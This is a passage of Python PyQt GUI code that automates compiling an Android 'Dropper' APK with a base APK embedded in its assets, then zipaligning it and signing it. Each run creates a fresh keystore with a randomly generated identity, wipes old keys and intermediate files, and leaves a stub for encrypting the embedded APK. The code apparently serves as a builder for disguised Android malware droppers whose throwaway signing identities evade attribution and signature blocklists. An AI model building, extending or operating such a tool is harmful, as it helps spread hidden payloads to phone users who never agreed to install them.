                self.logln(f'[INFO] Using system Gradle: {system_gradle}')
                cmd = f'"{system_gradle}" assembleDebug'
            else:
                cmd = f'"{gradlew}" assembleDebug'

            def _after_build(code: int):
                if code != 0:
                    self.logln(f"[ERROR] Gradle build exited with code {code}")
                    return
                # locate built APK and copy to Compile-Dropper
                debug_apk_dir = os.path.join(self.droper_root, 'app', 'build', 'outputs', 'apk', 'debug')
                latest = None
                latest_t = 0
                if os.path.isdir(debug_apk_dir):
                    for name in os.listdir(debug_apk_dir):
                        if name.endswith('.apk'):
                            p = os.path.join(debug_apk_dir, name)
                            t = os.path.getmtime(p)
                            if t > latest_t:
                                latest_t = t
                                latest = p
                if not latest:
                    self.logln('[WARN] No APK found in outputs/apk/debug after build')
                    return
                # Determine dist root (avoid dist/dist) and target folder
                dist_root = self._base_dir
                if os.path.basename(dist_root).lower() != 'dist':
                    dist_root = os.path.join(dist_root, 'dist')
                out_dir = os.path.join(dist_root, 'Compile-Dropper')
                ensure_dir(out_dir)
                # ensure only one APK remains in Comile-Dropper
                try:
                    for nm in os.listdir(out_dir):
                        if nm.lower().endswith('.apk'):
                            try:
                                os.remove(os.path.join(out_dir, nm))
                            except Exception:
                                pass
                except Exception:
                    pass
                dst = os.path.join(out_dir, f"dropper-debug-{datetime.now().strftime('%Y%m%d-%H%M%S')}.apk")
                try:
                    shutil.copy2(latest, dst)
                    self.logln(f"[OK] Droper APK copied to: {dst}")
                except Exception as e:
                    self.logln(f"[ERROR] Copy to Compile-Dropper failed: {e}")

            self.run_proc_cb(cmd, cwd=self.droper_root, env=env, on_done=_after_build)
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Build failed to start: {e}')
            self.logln(f"[ERROR] build: {e}")

    def on_gen_keystore(self):
        try:
            if not self.jdk_home:
                QMessageBox.critical(self, 'Error', 'JDK not detected — install JDK 17 and set JAVA_HOME')
                return
            # Generate identity locally (no network use)
            ident = random_identity()
            alias_name = ident["alias"]
            ks_pass = ident["ks_pass"]
            key_pass = ident["key_pass"]
            # Key size: use 3072 to align to supported modulus size
            key_size = 3072
            validity_days = 25 * 365 + 6  # ~25 years (leap buffer)
            dname = f'CN={ident["CN"]},O={ident["O"]},OU={ident["OU"]},L={ident["L"]},ST={ident["ST"]},C={ident["C"]}'

            # Honor custom keystore selection: .jks path or directory
            ks_sel = self.txtKsFile.text().strip() if hasattr(self, 'txtKsFile') else ''
            if ks_sel and ks_sel.lower().endswith('.jks'):
                ks_dir = os.path.dirname(ks_sel)
                ks_path = ks_sel
            else:
                dist_dir = self._base_dir
                if os.path.basename(dist_dir).lower() != 'dist':
                    dist_dir = os.path.join(dist_dir, 'dist')
                ks_dir = ks_sel or os.path.join(dist_dir, 'Keystore Keys')
                ks_path = os.path.join(ks_dir, 'release.jks')
            ensure_dir(ks_dir)

            # Save profile JSON for reference
            profile = {
                "alias": alias_name,
                "keystore": ks_path,
                "storepass": ks_pass,
                "keypass": key_pass,
                "dname": dname,
                "keysize": key_size,
                "validity_days": validity_days,
                "sigalg": "SHA256withRSA",
                "type": "PKCS12"
            }
            with open(os.path.join(ks_dir, f'{alias_name}.json'), 'w', encoding='utf-8') as w:
                json.dump(profile, w, indent=2)
            # Also write deterministic sidecar for auto-detection
            try:
                with open(os.path.join(ks_dir, 'release.json'), 'w', encoding='utf-8') as w2:
                    json.dump(profile, w2, indent=2)
            except Exception:
                pass

            keytool = find_keytool_path()
            if not keytool or not os.path.isfile(keytool):
                QMessageBox.critical(self, 'Error', 'keytool not found. Install JDK 17 or set JAVA_HOME correctly.')
                return
            # Quote passwords to prevent CMD parsing issues; use PKCS12
            key_pass = ks_pass
            cmd = (
                f'"{keytool}" -genkeypair -v '
                f'-keystore "{ks_path}" -storetype PKCS12 '
                f'-storepass "{ks_pass}" -keypass "{key_pass}" '
                f'-alias "{alias_name}" -keyalg RSA -keysize {key_size} -sigalg SHA256withRSA '
                f'-validity {validity_days} -dname "{dname}"'
            )
            # Run keytool, then sign only after it completes successfully
            def _after_keytool(code: int):
                if code != 0:
                    self.logln(f"[ERROR] keytool exited with code {code}; aborting sign")
                    return
                # Ensure keystore now exists
                if not os.path.isfile(ks_path):
                    self.logln("[ERROR] Keystore file not found after keytool run")
                    return
                self.txtKeystore.setText(ks_path)
                # After creating keystore, attempt automatic signing
                self.logln("[INFO] Keystore generated; starting sign of latest APK...")
                # Inject generated creds into UI fields so on_sign can reuse
                self.txtAlias.setText(alias_name)
                self.txtKsPass.setText(ks_pass)
                self.txtKeyPass.setText(key_pass)
                # call sign step
                self.on_sign()

            self.run_proc_cb(cmd, cwd=self._base_dir, on_done=_after_keytool)
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Keystore failed: {e}')
            self.logln(f"[ERROR] keystore: {e}")

    def on_sign(self):
        try:
            if not self.android_sdk:
                QMessageBox.critical(self, 'Error', 'Android SDK not detected')
                return
            bt = self.build_tools
            if not bt or not os.path.isdir(bt):
                QMessageBox.critical(self, 'Error', 'Build-Tools path invalid or not found')
                return
            # pick latest APK from Compile-Dropper (avoid dist/dist)
            dist_root = self._base_dir
            if os.path.basename(dist_root).lower() != 'dist':
                dist_root = os.path.join(dist_root, 'dist')
            src_dir = os.path.join(dist_root, 'Compile-Dropper')
            if not os.path.isdir(src_dir):
                QMessageBox.critical(self, 'Error', 'Compile-Dropper folder not found — run Compile with Dropper first')
                return
            latest = None
            latest_t = 0
            for name in os.listdir(src_dir):
                if name.endswith('.apk'):
                    p = os.path.join(src_dir, name)
                    t = os.path.getmtime(p)
                    if t > latest_t:
                        latest_t = t
                        latest = p
            if not latest:
                QMessageBox.critical(self, 'Error', 'Compile-Dropper me koi APK nahi mila — pehle Compile with Dropper chalayein')
                return
            stamped = latest

            # Ensure keystore: honor custom .jks or directory; else default to dist/Keystore Keys
            ks_sel = self.txtKsFile.text().strip() if hasattr(self, 'txtKsFile') else ''
            if ks_sel and ks_sel.lower().endswith('.jks'):
                ks_dir = os.path.dirname(ks_sel)
                ks_path = ks_sel
            else:
                dist_dir = self._base_dir
                if os.path.basename(dist_dir).lower() != 'dist':
                    dist_dir = os.path.join(dist_dir, 'dist')
                ks_dir = ks_sel or os.path.join(dist_dir, 'Keystore Keys')
                ks_path = os.path.join(ks_dir, 'release.jks')
            ensure_dir(ks_dir)
            # Always clear existing keystore artifacts so a fresh one is created
            try:
                for nm in os.listdir(ks_dir):
                    if nm.lower().endswith(('.jks', '.p12', '.keystore', '.json')):
                        try:
                            os.remove(os.path.join(ks_dir, nm))
                        except Exception:
                            pass
            except Exception:
                pass
            alias_name = (self.txtAlias.text().strip() or '')
            ks_pass = (self.txtKsPass.text().strip() or '')
            key_pass = (self.txtKeyPass.text().strip() or '')

            # If keystore exists and UI fields are empty, try loading sidecar JSON
            if os.path.isfile(ks_path) and (not alias_name or not ks_pass):
                sidecars = [os.path.join(ks_dir, 'release.json')]
                try:
                    for nm in os.listdir(ks_dir):
                        if nm.lower().endswith('.json'):
                            sidecars.append(os.path.join(ks_dir, nm))
                except Exception:
                    pass
                loaded = False
                for sc in sidecars:
                    try:
                        with open(sc, 'r', encoding='utf-8') as r:
                            cfg = json.load(r)
                        if os.path.normpath(cfg.get('keystore','')).lower() == os.path.normpath(ks_path).lower() or sc.endswith('release.json'):
                            alias_name = alias_name or cfg.get('alias','')
                            ks_pass = ks_pass or cfg.get('storepass','')
                            key_pass = key_pass or cfg.get('keypass', ks_pass)
                            loaded = True
                            self.logln(f"[PATH] Loaded keystore creds from {os.path.basename(sc)}")
                            break
                    except Exception:
                        continue
            if not os.path.isfile(ks_path):
                # generate quick keystore
                jdk = self.txtJdk.text().strip()
                if not jdk:
                    self.logln('[ERROR] JDK not set. Set JDK first.')
                    return
                keytool = os.path.join(jdk, 'bin', 'keytool.exe') if sys.platform.startswith('win') else os.path.join(jdk, 'bin', 'keytool')
                if not os.path.isfile(keytool):
                    self.logln('[ERROR] keytool not found under selected JDK')
                    return
                ident = random_identity()
                alias_name = ident['alias']
                ks_pass = ident['ks_pass']
                key_pass = ks_pass  # use same store/key password for PKCS12/JKS compatibility
                dname = f"CN={ident['CN']}, OU={ident['OU']}, O={ident['O']}, L={ident['L']}, ST={ident['ST']}, C={ident['C']}"
                cmd = [keytool,'-genkeypair','-v','-keystore', ks_path,
                       '-storetype','PKCS12',
                       '-storepass', ks_pass,'-keypass', key_pass,'-alias', alias_name,
                       '-keyalg','RSA','-keysize','2048','-validity','36500','-dname', dname]
                self.logln('[PATH] Generating keystore...')
                r = self._run_silent(cmd)
                self.logln(r.stdout or '')
                if not os.path.isfile(ks_path):
                    self.logln('[ERROR] Failed to generate keystore')
                    return
                self.txtKeystore.setText(ks_path)
                self.txtAlias.setText(alias_name)
                self.txtKsPass.setText(ks_pass)
                self.txtKeyPass.setText(key_pass)
                self.logln(f'[OK] Keystore created: {ks_path}')
            else:
                # Use existing keystore, ensure UI has values
                if not alias_name or not ks_pass:
                    # No creds available; attempt regeneration by backing up old keystore
                    try:
                        ts = datetime.now().strftime('%Y%m%d-%H%M%S')
                        backup = os.path.join(ks_dir, f"release-backup-{ts}.jks")
                        shutil.move(ks_path, backup)
                        self.logln(f"[WARN] Existing keystore moved to {backup} due to missing credentials; regenerating...")
                        # Trigger generation path by faking non-existence
                        if os.path.isfile(ks_path):
                            try:
                                os.remove(ks_path)
                            except Exception:
                                pass
                        # Re-run this section by recursive call
                        return self.on_sign()
                    except Exception as e:
                        self.logln(f"[ERROR] Cannot regenerate keystore automatically: {e}")
                        return

            # Prepare output
            final_dir = os.path.join(self._base_dir, 'Final Output Apk')
            ensure_dir(final_dir)
            aligned_apk = os.path.join(final_dir, 'aligned-temp.apk')
            signed_apk = os.path.join(final_dir, os.path.basename(stamped).replace('.apk', '-signed.apk'))

            # zipalign
            zipalign = os.path.join(bt, 'zipalign.exe') if sys.platform.startswith('win') else os.path.join(bt, 'zipalign')
            if not os.path.isfile(zipalign):
                self.logln('[ERROR] zipalign not found in Build-Tools')
                return
            self.logln('[PATH] zipalign running...')
            z = self._run_silent([zipalign, '-f', '4', stamped, aligned_apk])
            _zout = z.stdout or ''
            if 'header mismatch' in _zout:
                self.logln('[WARN] zipalign reported header mismatch warnings (safe to ignore)')
            else:
                self.logln(_zout)
            if z.returncode != 0 or not os.path.isfile(aligned_apk):
                self.logln('[ERROR] zipalign failed')
                return

            # apksigner with v2/v3/v4
            apksigner = os.path.join(bt, 'apksigner.bat') if sys.platform.startswith('win') else os.path.join(bt, 'apksigner')
            if not os.path.isfile(apksigner):
                self.logln('[ERROR] apksigner not found in Build-Tools')
                return
            sign_cmd = [
                apksigner, 'sign',
                '--v1-signing-enabled', 'false',
                '--v2-signing-enabled', 'true',
                '--v3-signing-enabled', 'true',
                '--v4-signing-enabled', 'true',
                '--ks', ks_path,
                '--ks-pass', f'pass:{ks_pass}',
                '--key-pass', f'pass:{key_pass}',
                '--ks-key-alias', alias_name,
                '--out', signed_apk,
                aligned_apk
            ]
            self.logln('[PATH] apksigner running...')
            r = self._run_silent(sign_cmd)
            self.logln(r.stdout or '')
            if r.returncode != 0 or not os.path.isfile(signed_apk):
                self.logln('[ERROR] Signing failed')
                return
            # verify
            ver = self._run_silent([apksigner, 'verify', '--verbose', signed_apk])
            self.logln(ver.stdout or '')
            if ver.returncode != 0:
                self.logln('[WARN] apksigner verify reported issues')
            self.logln('[OK] APK signed successfully (v2/v3/v4)')
            try:
                os.remove(aligned_apk)
            except Exception:
                pass
            # Cleanup intermediate folders and assets after final output is ready
            try:
                dist_root = self._base_dir
                if os.path.basename(dist_root).lower() != 'dist':
                    dist_root = os.path.join(dist_root, 'dist')
                for folder in ['Compile-Dropper', 'Sign Base Apk']:
                    fdir = os.path.join(dist_root, folder)
                    if os.path.isdir(fdir):
                        for nm in os.listdir(fdir):
                            fp = os.path.join(fdir, nm)
                            if os.path.isfile(fp):
                                try:
                                    os.remove(fp)
                                except Exception:
                                    pass
                # Clear Droper assets
                if getattr(self, 'assets_path', '') and os.path.isdir(self.assets_path):
                    for nm in os.listdir(self.assets_path):
                        fp = os.path.join(self.assets_path, nm)
                        if os.path.isfile(fp):
                            try:
                                os.remove(fp)
                            except Exception:
                                pass
                self.logln('[OK] Cleaned intermediate folders and assets after final signing')
            except Exception as e:
                self.logln(f"[WARN] Post-sign cleanup issue: {e}")
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Sign failed: {e}')
            self.logln(f"[ERROR] sign: {e}")

    def on_sign_base(self):
        """Sign the base APK from Droper assets into dist/Sign Base Apk using v2+v3."""
        try:
            self.resolve_paths()
            if not self.assets_path:
                QMessageBox.critical(self, 'Error', 'Set Project Root first')
                return
            # Source APK from assets (new flow uses base1.apk; fallback to base.apk)
            src = os.path.join(self.assets_path, 'base1.apk')
            if not os.path.isfile(src):
                src = os.path.join(self.assets_path, 'base.apk')
            if not os.path.isfile(src):
                QMessageBox.critical(self, 'Error', 'No base1.apk (or base.apk) in assets — use Select APK → Assets first')
                return

            # Build-Tools: zipalign + apksigner
            bt = self.build_tools
            if not bt or not os.path.isdir(bt):
                QMessageBox.critical(self, 'Error', 'Build-Tools path invalid or not found')
                return
            zipalign = os.path.join(bt, 'zipalign.exe') if sys.platform.startswith('win') else os.path.join(bt, 'zipalign')
            apksigner = os.path.join(bt, 'apksigner.bat') if sys.platform.startswith('win') else os.path.join(bt, 'apksigner')
            if not os.path.isfile(zipalign):
                self.logln('[ERROR] zipalign not found in Build-Tools')
                return
            if not os.path.isfile(apksigner):
                self.logln('[ERROR] apksigner not found in Build-Tools')
                return

            # Keystore selection: honor custom .jks or directory; else default to dist/Keystore Keys
            ks_sel = self.txtKsFile.text().strip() if hasattr(self, 'txtKsFile') else ''
            if ks_sel and ks_sel.lower().endswith('.jks'):
                ks_dir = os.path.dirname(ks_sel)
                ks_path = ks_sel
            else:
                dist_dir = self._base_dir
                if os.path.basename(dist_dir).lower() != 'dist':
                    dist_dir = os.path.join(dist_dir, 'dist')
                ks_dir = ks_sel or os.path.join(dist_dir, 'Keystore Keys')
                ks_path = os.path.join(ks_dir, 'release.jks')
            ensure_dir(ks_dir)

            # Load creds from UI or sidecar; generate keystore if missing
            alias_name = (self.txtAlias.text().strip() or '')
            ks_pass = (self.txtKsPass.text().strip() or '')
            key_pass = (self.txtKeyPass.text().strip() or '')
            if os.path.isfile(ks_path) and (not alias_name or not ks_pass):
                # try release.json or any *.json
                try:
                    sc_list = [os.path.join(ks_dir, 'release.json')]
                    for nm in os.listdir(ks_dir):
                        if nm.lower().endswith('.json'):
                            sc_list.append(os.path.join(ks_dir, nm))
                    for sc in sc_list:
                        try:
                            with open(sc, 'r', encoding='utf-8') as r:
                                cfg = json.load(r)
                            if os.path.normpath(cfg.get('keystore','')).lower() == os.path.normpath(ks_path).lower() or sc.endswith('release.json'):
                                alias_name = alias_name or cfg.get('alias','')
                                ks_pass = ks_pass or cfg.get('storepass','')
                                key_pass = key_pass or cfg.get('keypass', ks_pass)
                                self.logln(f"[PATH] Loaded keystore creds from {os.path.basename(sc)}")
                                break
                        except Exception:
                            continue
                except Exception:
                    pass

            if not os.path.isfile(ks_path):
                # Generate keystore synchronously using current JDK
                jdk = self.txtJdk.text().strip()
                if not jdk:
                    self.logln('[ERROR] JDK not set. Set JDK first.')
                    return
                keytool = os.path.join(jdk, 'bin', 'keytool.exe') if sys.platform.startswith('win') else os.path.join(jdk, 'bin', 'keytool')
                if not os.path.isfile(keytool):
                    self.logln('[ERROR] keytool not found under selected JDK')
                    return
                ident = random_identity()
                alias_name = ident['alias']
                ks_pass = ident['ks_pass']
                key_pass = ks_pass
                dname = f"CN={ident['CN']}, OU={ident['OU']}, O={ident['O']}, L={ident['L']}, ST={ident['ST']}, C={ident['C']}"
                cmd = [keytool,'-genkeypair','-v','-keystore', ks_path,
                       '-storetype','PKCS12','-storepass', ks_pass,'-keypass', key_pass,'-alias', alias_name,
                       '-keyalg','RSA','-keysize','2048','-validity','36500','-dname', dname]
                self.logln('[PATH] Generating keystore...')
                r = self._run_silent(cmd)
                self.logln(r.stdout or '')
                if not os.path.isfile(ks_path):
                    self.logln('[ERROR] Failed to generate keystore')
                    return
                # write sidecar
                profile = {
                    'alias': alias_name,
                    'keystore': ks_path,
                    'storepass': ks_pass,
                    'keypass': key_pass,
                    'dname': dname,
                    'type': 'PKCS12'
                }
                try:
                    with open(os.path.join(ks_dir, 'release.json'), 'w', encoding='utf-8') as w:
                        json.dump(profile, w, indent=2)
                except Exception:
                    pass
                self.txtKeystore.setText(ks_path)
                self.txtAlias.setText(alias_name)
                self.txtKsPass.setText(ks_pass)
                self.txtKeyPass.setText(key_pass)
                self.logln(f'[OK] Keystore created: {ks_path}')

            # Output dir for signed base apk (under existing dist root)
            dist_root = self._base_dir
            if os.path.basename(dist_root).lower() != 'dist':
                dist_root = os.path.join(dist_root, 'dist')
            out_dir = os.path.join(dist_root, 'Sign Base Apk')
            ensure_dir(out_dir)
            aligned_apk = os.path.join(out_dir, 'aligned-temp.apk')
            signed_apk = os.path.join(out_dir, f"base-signed-{datetime.now().strftime('%Y%m%d-%H%M%S')}.apk")

            # zipalign
            self.logln('[PATH] zipalign (base) running...')
            z = self._run_silent([zipalign, '-f', '4', src, aligned_apk])
            _bz = z.stdout or ''
            if 'header mismatch' in _bz:
                self.logln('[WARN] zipalign (base): header mismatch warnings (safe to ignore)')
            else:
                self.logln(_bz)
            if z.returncode != 0 or not os.path.isfile(aligned_apk):
                self.logln('[ERROR] zipalign failed for base')
                return

            # sign v2/v3/v4
            self.logln('[PATH] apksigner (base) running...')
            sign_cmd = [
                apksigner, 'sign',
                '--v1-signing-enabled', 'false',
                '--v2-signing-enabled', 'true',
                '--v3-signing-enabled', 'true',
                '--v4-signing-enabled', 'true',
                '--ks', ks_path,
                '--ks-pass', f'pass:{ks_pass}',
                '--key-pass', f'pass:{key_pass}',
                '--ks-key-alias', alias_name,
                '--out', signed_apk,
                aligned_apk
            ]
            r = self._run_silent(sign_cmd)
            self.logln(r.stdout or '')
            if r.returncode != 0 or not os.path.isfile(signed_apk):
                self.logln('[ERROR] Signing base APK failed')
                return
            # verify
            ver = self._run_silent([apksigner, 'verify', '--verbose', signed_apk])
            self.logln(ver.stdout or '')
            if ver.returncode != 0:
                self.logln('[WARN] apksigner verify (base) reported issues')
            self.logln(f'[OK] Base APK signed (v2/v3/v4) -> {signed_apk}')
            try:
                os.remove(aligned_apk)
            except Exception:
                pass
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Sign base failed: {e}')
            self.logln(f"[ERROR] sign base: {e}")

    def on_encrypt_base(self):
        """Placeholder: encrypt the base APK (to be defined precisely)."""
        self.logln('[WARN] Encrypt base Apk: Not implemented yet. Provide the encryption method and target APK.')

    def _run_silent(self, cmd, shell: bool=False):
        """Run a subprocess with no visible window; capture stdout/stderr."""
        si = None
        cf = 0
        if sys.platform.startswith('win'):
            try:
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                cf = subprocess.CREATE_NO_WINDOW
            except Exception:
                si = None
                cf = 0
        return subprocess.run(cmd, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, startupinfo=si, creationflags=cf)

    # Removed on_package: user requested to remove PyInstaller packaging from the GUI

    # manual keystore browsing removed; auto-managed

    def _set_running(self, running: bool):
        self._is_running = running
        for btn in [self.btnSelectApk, self.btnSplit, self.btnBuild, self.btnGenKs, self.btnBrowseRoot]:
            try:
                btn.setEnabled(not running)
            except Exception:
                pass

    def run_proc(self, cmd: str, cwd: str|None=None, env=None):
        self.logln(f"> {cmd}")
        th = ProcThread(cmd, cwd=cwd, env=env)
        self._threads.append(th)
        self._set_running(True)
        def on_done(code: int, thref=th):
            self.logln(f"[exit {code}]")
            try:
                self._threads.remove(thref)
            except ValueError:
                pass
            if not self._threads:
                self._set_running(False)
        th.line.connect(lambda ln: self.logln(ln))
        th.done.connect(on_done)
        th.start()

    def run_proc_cb(self, cmd: str, cwd: str|None=None, env=None, on_done=None):
        """Run a process and call on_done(exit_code) after completion."""
        self.logln(f"> {cmd}")
        th = ProcThread(cmd, cwd=cwd, env=env)
        self._threads.append(th)
        self._set_running(True)
        def _finish(code: int, thref=th):
            self.logln(f"[exit {code}]")
            try:
                self._threads.remove(thref)
            except ValueError:
                pass
            if not self._threads:
                self._set_running(False)
            try:
                if on_done:
                    on_done(code)
            except Exception as cb_err:
                self.logln(f"[ERROR] on_done callback: {cb_err}")
        th.line.connect(lambda ln: self.logln(ln))
        th.done.connect(_finish)
        th.start()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    w = Main()
    w.show()
    sys.exit(app.exec())
